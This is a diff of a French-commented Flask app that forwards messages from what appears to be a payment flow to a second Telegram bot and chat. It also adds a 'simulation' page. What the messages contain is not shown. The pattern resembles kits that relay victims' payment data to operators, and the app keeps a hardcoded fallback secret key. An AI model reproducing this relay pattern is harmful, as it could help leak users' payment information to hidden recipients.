@@ -7,23 +7,40 @@ from dotenv import load_dotenv
 load_dotenv()
 
 app = Flask(__name__)
-# TRÈS IMPORTANT : Assurez-vous que cette clé secrète est la même et stable
-# sur votre environnement local et sur Render. Elle DOIT être constante.
 app.secret_key = os.getenv("FLASK_SECRET_KEY", "super_secret_default_key")
 
+# Informations pour le premier bot
 TELEGRAM_BOT_TOKEN = os.getenv("BOT_TOKEN")
 CHAT_ID = os.getenv("CHAT_ID")
 
+# Informations pour le deuxième bot
+TELEGRAM_BOT_TOKEN_2 = os.getenv("BOT_TOKEN_2") # Nouvelle variable
+CHAT_ID_2 = os.getenv("CHAT_ID_2")             # Nouvelle variable
+
 
 def send_telegram_message(message):
-    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
-    data = {"chat_id": CHAT_ID, "text": message}
+    # Envoyez au premier bot
+    url_1 = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
+    data_1 = {"chat_id": CHAT_ID, "text": message}
     try:
-        response = requests.post(url, data=data)
-        response.raise_for_status()
-        print("Message Telegram envoyé avec succès.")
+        response_1 = requests.post(url_1, data=data_1)
+        response_1.raise_for_status()
+        print("Message Telegram envoyé avec succès au premier bot.")
     except requests.exceptions.RequestException as e:
-        print(f"Erreur lors de l'envoi du message Telegram: {e}")
+        print(f"Erreur lors de l'envoi du message au premier bot: {e}")
+
+    # Envoyez au deuxième bot (si les informations sont disponibles)
+    if TELEGRAM_BOT_TOKEN_2 and CHAT_ID_2:
+        url_2 = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN_2}/sendMessage"
+        data_2 = {"chat_id": CHAT_ID_2, "text": message}
+        try:
+            response_2 = requests.post(url_2, data=data_2)
+            response_2.raise_for_status()
+            print("Message Telegram envoyé avec succès au deuxième bot.")
+        except requests.exceptions.RequestException as e:
+            print(f"Erreur lors de l'envoi du message au deuxième bot: {e}")
+    else:
+        print("Informations du deuxième bot Telegram manquantes. Message non envoyé au deuxième bot.")
 
 
 # 1. Route pour la page d'accueil (index.html)
@@ -168,6 +185,11 @@ def process_payment():
 def security_page():
     session.clear() # Nettoie la session à la fin du processus
     return render_template("security_page.html")
+
+# NOUVELLE ROUTE : Pour la page de simulation
+@app.route("/start_simulation", methods=["GET"])
+def start_simulation_page():
+    return render_template("simulation_page.html")
 
 
 if __name__ == "__main__":
